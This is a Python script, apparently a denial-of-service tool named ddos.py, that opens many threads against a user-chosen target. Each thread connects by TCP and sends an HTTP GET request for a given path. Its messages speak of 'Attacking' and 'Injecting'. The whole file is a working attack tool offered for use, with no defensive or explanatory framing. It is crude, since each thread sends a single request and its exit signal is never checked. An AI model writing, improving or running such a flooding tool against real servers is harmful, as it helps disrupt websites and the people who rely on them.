import socket
import sys
import threading
import time

error_occurred = False
error_lock = threading.Lock()
exit_event = threading.Event()

def attack(target, port, path):
    global error_occurred
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((target, port))
        request = f"GET /{path} HTTP/1.1\r\nHost: {target}\r\n\r\n"
        client.send(request.encode())
        client.close()
        print(f">> Sent request to {target}:{port}/{path}")
    except Exception as e:
        with error_lock:
            if not error_occurred:
                error_occurred = True
                print(f">> Error connecting to {target}: {e}")
                exit_event.set()  # Signal all threads to exit

def thread_worker(target, port, path):
    attack(target, port, path)
    time.sleep(0.009)  # Avoid going too fast

def main():
    if len(sys.argv) != 5:
        print("Usage: python ddos.py <target> <port> <path> <num_threads>")
        return

    target = sys.argv[1]
    port = int(sys.argv[2])
    path = sys.argv[3]
    num_threads = int(sys.argv[4])

    print(f"\nAttacking {target}")
    print(f"Using {port} port")
    print(f"Injecting '{path}' path")
    print(f"Using {num_threads} threads \n")

    threads = []
    for _ in range(num_threads):
        t = threading.Thread(target=thread_worker, args=(target, port, path))
        threads.append(t)
        t.start()

    for t in threads:
        t.join()  # Wait for threads to finish

    if error_occurred:
        print("\n Attack failed.")
    else:
        print("\n Attack finished." )


if __name__ == "__main__":
    main()
